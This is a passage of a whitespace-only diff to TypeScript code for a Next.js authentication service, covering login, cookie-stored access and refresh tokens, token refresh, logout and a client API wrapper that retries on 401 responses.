+      },
+      data: { revoked: true },
+    })
+  }
 
-	/**
-	 * Clean up expired Refresh Token metadata
-	 */
-	async cleanupExpiredRefreshTokens(): Promise<number> {
-		const result = await this.prisma.refreshTokenMetadata.deleteMany({
-			where: {
-				expiresAt: {
-					lt: new Date(),
-				},
-			},
-		})
-		return result.count
-	}
+  /**
+   * Clean up expired Refresh Token metadata
+   */
+  async cleanupExpiredRefreshTokens(): Promise<number> {
+    const result = await this.prisma.refreshTokenMetadata.deleteMany({
+      where: {
+        expiresAt: {
+          lt: new Date(),
+        },
+      },
+    })
+    return result.count
+  }
 
-	/**
-	 * Login (new version, with refresh tokens)
-	 */
-	async login(name: string, password: string) {
-		try {
-			// 1. Find user
-			const user = await this.prisma.user.findUnique({ where: { name } })
+  /**
+   * Login (new version, with refresh tokens)
+   */
+  async login(name: string, password: string) {
+    try {
+      // 1. Find user
+      const user = await this.prisma.user.findUnique({ where: { name } })
 
-			if (!user) {
-				return { code: -1, message: 'Invalid username or password' }
-			}
+      if (!user) {
+        return { code: -1, message: 'Invalid username or password' }
+      }
 
-			// 2. Verify password
-			const isValid = await verify(user.password, password)
-			if (!isValid) {
-				return { code: -1, message: 'Invalid username or password' }
-			}
+      // 2. Verify password
+      const isValid = await verify(user.password, password)
+      if (!isValid) {
+        return { code: -1, message: 'Invalid username or password' }
+      }
 
-			// 3. Generate Access Token and Refresh Token
-			const accessToken = await this.generateAccessToken({
-				userId: user.id,
-				name: user.name,
-			})
-			const refreshToken = await this.generateRefreshToken(user.id)
+      // 3. Generate Access Token and Refresh Token
+      const accessToken = await this.generateAccessToken({
+        userId: user.id,
+        name: user.name,
+      })
+      const refreshToken = await this.generateRefreshToken(user.id)
 
-			// 4. Set Cookie
-			const cookieStore = await cookies()
+      // 4. Set Cookie
+      const cookieStore = await cookies()
 
-			// Access Token: short-lived, path=/ works site-wide
-			cookieStore.set('access_token', accessToken, {
-				httpOnly: true,
-				secure: process.env.NODE_ENV === 'production',
-				sameSite: 'lax',
-				maxAge: 15 * 60, // 15 minutes
-				path: '/',
-			})
+      // Access Token: short-lived, path=/ works site-wide
+      cookieStore.set('access_token', accessToken, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 15 * 60, // 15 minutes
+        path: '/',
+      })
 
-			// Refresh Token: long-lived, path=/api/auth/refresh only used for refresh
-			cookieStore.set('refresh_token', refreshToken, {
-				httpOnly: true,
-				secure: process.env.NODE_ENV === 'production',
-				sameSite: 'lax',
-				maxAge: 7 * 24 * 60 * 60, // 7 days
-				path: '/api/auth/refresh', // Key: only sent to refresh endpoint
-			})
+      // Refresh Token: long-lived, path=/api/auth/refresh only used for refresh
+      cookieStore.set('refresh_token', refreshToken, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 7 * 24 * 60 * 60, // 7 days
+        path: '/api/auth/refresh', // Key: only sent to refresh endpoint
+      })
 
-			return {
-				code: 0,
-				message: 'Login successful',
-				data: {
-					user: { id: user.id, name: user.name },
-				},
-			}
-		} catch (error) {
-			console.error('Login failed:', error)
-			return { code: -1, message: 'Login failed' }
-		}
-	}
+      return {
+        code: 0,
+        message: 'Login successful',
+        data: {
+          user: { id: user.id, name: user.name },
+        },
+      }
+    } catch (error) {
+      console.error('Login failed:', error)
+      return { code: -1, message: 'Login failed' }
+    }
+  }
 
-	/**
-	 * Refresh Access Token
-	 */
-	async refreshAccessToken(): Promise<{
-		success: boolean
-		accessToken?: string
-		error?: string
-	}> {
-		try {
-			const cookieStore = await cookies()
-			const refreshToken = cookieStore.get('refresh_token')?.value
+  /**
+   * Refresh Access Token
+   */
+  async refreshAccessToken(): Promise<{
+    success: boolean
+    accessToken?: string
+    error?: string
+  }> {
+    try {
+      const cookieStore = await cookies()
+      const refreshToken = cookieStore.get('refresh_token')?.value
 
-			if (!refreshToken) {
-				return { success: false, error: 'No refresh token provided' }
-			}
+      if (!refreshToken) {
+        return { success: false, error: 'No refresh token provided' }
+      }
 
-			// Verify Refresh Token
-			const verification = await this.verifyRefreshToken(refreshToken)
+      // Verify Refresh Token
+      const verification = await this.verifyRefreshToken(refreshToken)
 
-			if (!verification.isValid || !verification.userId) {
-				return { success: false, error: 'Refresh token invalid or expired' }
-			}
+      if (!verification.isValid || !verification.userId) {
+        return { success: false, error: 'Refresh token invalid or expired' }
+      }
 
-			// Get user info
-			const user = await this.prisma.user.findUnique({
-				where: { id: verification.userId },
-			})
+      // Get user info
+      const user = await this.prisma.user.findUnique({
+        where: { id: verification.userId },
+      })
 
-			if (!user) {
-				return { success: false, error: 'User not found' }
-			}
+      if (!user) {
+        return { success: false, error: 'User not found' }
+      }
 
-			// Generate new Access Token
-			const newAccessToken = await this.generateAccessToken({
-				userId: user.id,
-				name: user.name,
-			})
+      // Generate new Access Token
+      const newAccessToken = await this.generateAccessToken({
+        userId: user.id,
+        name: user.name,
+      })
 
-			// Set new Access Token Cookie
-			cookieStore.set('access_token', newAccessToken, {
-				httpOnly: true,
-				secure: process.env.NODE_ENV === 'production',
-				sameSite: 'lax',
-				maxAge: 15 * 60,
-				path: '/',
-			})
+      // Set new Access Token Cookie
+      cookieStore.set('access_token', newAccessToken, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 15 * 60,
+        path: '/',
+      })
 
-			return { success: true, accessToken: newAccessToken }
-		} catch (error) {
-			console.error('Refresh token failed:', error)
-			return { success: false, error: 'Refresh failed' }
-		}
-	}
+      return { success: true, accessToken: newAccessToken }
+    } catch (error) {
+      console.error('Refresh token failed:', error)
+      return { success: false, error: 'Refresh failed' }
+    }
+  }
 
-	/**
-	 * Logout
-	 */
-	async logout(): Promise<void> {
-		try {
-			const cookieStore = await cookies()
-			const refreshToken = cookieStore.get('refresh_token')?.value
+  /**
+   * Logout
+   */
+  async logout(): Promise<void> {
+    try {
+      const cookieStore = await cookies()
+      const refreshToken = cookieStore.get('refresh_token')?.value
 
-			// If there's a Refresh Token, revoke it
-			if (refreshToken) {
-				try {
-					const verification = await this.verifyRefreshToken(refreshToken)
-					if (verification.jti) {
-						await this.revokeRefreshToken(verification.jti)
-					}
-				} catch {
-					// Ignore error, token might be expired
-				}
-			}
+      // If there's a Refresh Token, revoke it
+      if (refreshToken) {
+        try {
+          const verification = await this.verifyRefreshToken(refreshToken)
+          if (verification.jti) {
+            await this.revokeRefreshToken(verification.jti)
+          }
+        } catch {
+          // Ignore error, token might be expired
+        }
+      }
 
-			// Clear Cookies
-			cookieStore.delete('access_token')
-			cookieStore.delete('refresh_token')
-		} catch (error) {
-			console.error('Logout failed:', error)
-		}
-	}
+      // Clear Cookies
+      cookieStore.delete('access_token')
+      cookieStore.delete('refresh_token')
+    } catch (error) {
+      console.error('Logout failed:', error)
+    }
+  }
 
-	/**
-	 * Get current user
-	 */
-	async getCurrentUser(): Promise<JWTPayload | null> {
-		try {
-			const cookieStore = await cookies()
-			const accessToken = cookieStore.get('access_token')?.value
+  /**
+   * Get current user
+   */
+  async getCurrentUser(): Promise<JWTPayload | null> {
+    try {
+      const cookieStore = await cookies()
+      const accessToken = cookieStore.get('access_token')?.value
 
-			if (!accessToken) {
-				return null
-			}
+      if (!accessToken) {
+        return null
+      }
 
-			const { payload } = await jwtVerify(accessToken, this.accessTokenPublicKey)
-			return payload
-		} catch {
-			return null
-		}
-	}
+      const { payload } = await jwtVerify(accessToken, this.accessTokenPublicKey)
+      return payload
+    } catch {
+      return null
+    }
+  }
 }
 
 export const authService = new AuthService()
@@ -1438,16 +1438,16 @@ import { NextResponse } from 'next/server'
 import { authService } from '@/lib/auth-service'
 
 export async function POST() {
-	const result = await authService.refreshAccessToken()
+  const result = await authService.refreshAccessToken()
 
-	if (!result.success) {
-		return NextResponse.json({ code: -1, message: result.error }, { status: 401 })
-	}
+  if (!result.success) {
+    return NextResponse.json({ code: -1, message: result.error }, { status: 401 })
+  }
 
-	return NextResponse.json({
-		code: 0,
-		message: 'Token refreshed successfully',
-	})
+  return NextResponse.json({
+    code: 0,
+    message: 'Token refreshed successfully',
+  })
 }
 ```
 
@@ -1457,109 +1457,109 @@ export async function POST() {
 // lib/api-client.ts
 
 class ApiClient {
-	private isRefreshing = false
-	private refreshSubscribers: Array<(token: string) => void> = []
+  private isRefreshing = false
+  private refreshSubscribers: Array<(token: string) => void> = []
 
-	/**
-	 * Subscribe to refresh success callback
-	 */
-	subscribeTokenRefresh(callback: (token: string) => void) {
-		this.refreshSubscribers.push(callback)
-	}
+  /**
+   * Subscribe to refresh success callback
+   */
+  subscribeTokenRefresh(callback: (token: string) => void) {
+    this.refreshSubscribers.push(callback)
+  }
 
-	/**
-	 * Notify all subscribers
-	 */
-	notifyTokenRefresh(newToken: string) {
-		this.refreshSubscribers.forEach((callback) => callback(newToken))
-		this.refreshSubscribers = []
-	}
+  /**
+   * Notify all subscribers
+   */
+  notifyTokenRefresh(newToken: string) {
+    this.refreshSubscribers.forEach((callback) => callback(newToken))
+    this.refreshSubscribers = []
+  }
 
-	/**
-	 * Refresh Token
-	 */
-	private async refreshToken(): Promise<boolean> {
-		if (this.isRefreshing) {
-			// Already refreshing, wait for refresh to complete
-			return new Promise((resolve) => {
-				this.subscribeTokenRefresh(() => resolve(true))
-			})
-		}
+  /**
+   * Refresh Token
+   */
+  private async refreshToken(): Promise<boolean> {
+    if (this.isRefreshing) {
+      // Already refreshing, wait for refresh to complete
+      return new Promise((resolve) => {
+        this.subscribeTokenRefresh(() => resolve(true))
+      })
+    }
 
-		this.isRefreshing = true
+    this.isRefreshing = true
 
-		try {
-			const response = await fetch('/api/auth/refresh', {
-				method: 'POST',
-			})
+    try {
+      const response = await fetch('/api/auth/refresh', {
+        method: 'POST',
+      })
 
-			if (response.ok) {
-				this.isRefreshing = false
-				this.notifyTokenRefresh('refreshed')
-				return true
-			}
+      if (response.ok) {
+        this.isRefreshing = false
+        this.notifyTokenRefresh('refreshed')
+        return true
+      }
 
-			// Refresh failed, redirect to login
-			window.location.href = '/login'
-			return false
-		} catch {
-			this.isRefreshing = false
-			window.location.href = '/login'
-			return false
-		}
-	}
+      // Refresh failed, redirect to login
+      window.location.href = '/login'
+      return false
+    } catch {
+      this.isRefreshing = false
+      window.location.href = '/login'
+      return false
+    }
+  }
 
-	/**
-	 * Make API request (with auto-refresh)
-	 */
-	async request<T>(url: string, options: RequestInit = {}): Promise<T> {
-		// Get current Token
-		const accessToken = await this.getAccessToken()
+  /**
+   * Make API request (with auto-refresh)
+   */
+  async request<T>(url: string, options: RequestInit = {}): Promise<T> {
+    // Get current Token
+    const accessToken = await this.getAccessToken()
 
-		// Set request headers
-		const headers = {
-			'Content-Type': 'application/json',
-			...(accessToken && { Authorization: `Bearer ${accessToken}` }),
-			...options.headers,
-		}
+    // Set request headers
+    const headers = {
+      'Content-Type': 'application/json',
+      ...(accessToken && { Authorization: `Bearer ${accessToken}` }),
+      ...options.headers,
+    }
 
-		let response = await fetch(url, {
-			...options,
-			headers,
-		})
+    let response = await fetch(url, {
+      ...options,
+      headers,
+    })
 
-		// If returns 401, try refresh
-		if (response.status === 401) {
-			const refreshSuccess = await this.refreshToken()
+    // If returns 401, try refresh
+    if (response.status === 401) {
+      const refreshSuccess = await this.refreshToken()
 
-			if (refreshSuccess) {
-				// Get new Token and retry
-				const newToken = await this.getAccessToken()
-				response = await fetch(url, {
-					...options,
-					headers: {
-						...headers,
-						Authorization: `Bearer ${newToken}`,
-					},
-				})
-			}
-		}
+      if (refreshSuccess) {
+        // Get new Token and retry
+        const newToken = await this.getAccessToken()
+        response = await fetch(url, {
+          ...options,
+          headers: {
+            ...headers,
+            Authorization: `Bearer ${newToken}`,
+          },
+        })
+      }
+    }
 
-		if (!response.ok) {
-			throw new Error(`Request failed: ${response.status}`)
-		}
+    if (!response.ok) {
+      throw new Error(`Request failed: ${response.status}`)
+    }
 
-		return response.json()
-	}
+    return response.json()
+  }
 
-	/**
-	 * Get Access Token
-	 */
-	private async getAccessToken(): Promise<string | null> {
-		const { cookies } = await import('next/headers')
-		const cookieStore = await cookies()
-		return cookieStore.get('access_token')?.value || null
-	}
+  /**
+   * Get Access Token
+   */
+  private async getAccessToken(): Promise<string | null> {
+    const { cookies } = await import('next/headers')
+    const cookieStore = await cookies()
+    return cookieStore.get('access_token')?.value || null
+  }
 }
 
 export const apiClient = new ApiClient()
